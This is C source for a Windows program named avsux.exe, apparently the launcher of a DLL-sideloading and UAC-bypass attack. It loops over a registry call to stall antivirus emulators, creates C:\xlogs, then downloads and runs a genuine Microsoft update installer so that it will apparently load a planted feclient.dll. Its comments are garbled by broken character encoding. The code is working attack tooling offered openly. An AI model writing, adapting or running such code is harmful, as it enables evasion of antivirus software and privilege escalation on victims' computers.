/***************************************************************************************************************\
*																												*
*											avsux.exe															*
*																												*
* avsux.exe �������� � ���� � feclient.dll (����� ���);															*
* ������, ������� ����� ������ ����� � ���� ��� � ���� �����. ����� ��������� ��� �����.						*
* ��� ������� ���������� C:\xlogs, �������� ����������� ������ (� �� �� �����, ��� ����� � ���) ����� �		*
* �������� ���. ������ �������� ��������� ����������, � ���� ���� ������� - �� ���� ��� ����� ������ ���� ��	*
* ���������� �����������. ��� ���� �� ��� ���������� ������ uac;												* 
*																												*
\***************************************************************************************************************/

																							//m1x
																							//pr0mix@mail.ru
																							//EOF



#include <windows.h>
#include <urlmon.h>



#pragma comment(lib, "urlmon.lib")	//���������� ���������� ������ ����; 



//���� ������� ����� WinMain; 
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	char szFileName[MAX_PATH];
	HRESULT res; 
	char szDirName[] = "C:\\xlogs";
	int i = 0; 
	HKEY hKey; 
	LPSTR *pPart;

	for(i = 0; i< 15000; i++)	//��� ���� ����� ��� ������ ������� ���32; 
	{
		if(RegOpenKeyExA(HKEY_LOCAL_MACHINE, "eba!", 0, KEY_QUERY_VALUE | KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
		{
			MessageBoxA(0, "eba!", "eba!", MB_OK);
		}
	}

	GetModuleFileNameA(0, szFileName, MAX_PATH);	//�������� ������ ���� � avsux.exe; 
	GetFullPathNameA(szFileName, MAX_PATH, szFileName, &pPart);	//pPart - ��������� �� ��� avsux.exe; 
	pPart[0] = 0;	//�������� ��� - �������� ������ ������ ���� (��� ����� - ���); 
	CreateDirectoryA(szDirName, 0);	//������ ���������� ��� ����� ��� (��� ��� ������� ��� � ����� � ���� ������); 
	strcat(szFileName, "Windows-KB243657.exe");	//��������� ��� ��� �������� ���������� ������� �����; 
	res = URLDownloadToFileA(0, "http://download.microsoft.com/download/B/0/0/B00DF5E6-9A8F-403C-AB57-AED66C7E5BEE/WindowsXP-KB2393802-x86-ENU.exe", szFileName, 0, 0);	//��������� ����; 

	if (res == S_OK)
	{
		ShellExecuteA(NULL, "open", szFileName, NULL, NULL, SW_SHOW);	//���� �� ���, ����� �������� ���� ����; 
	}

	return 0;
}
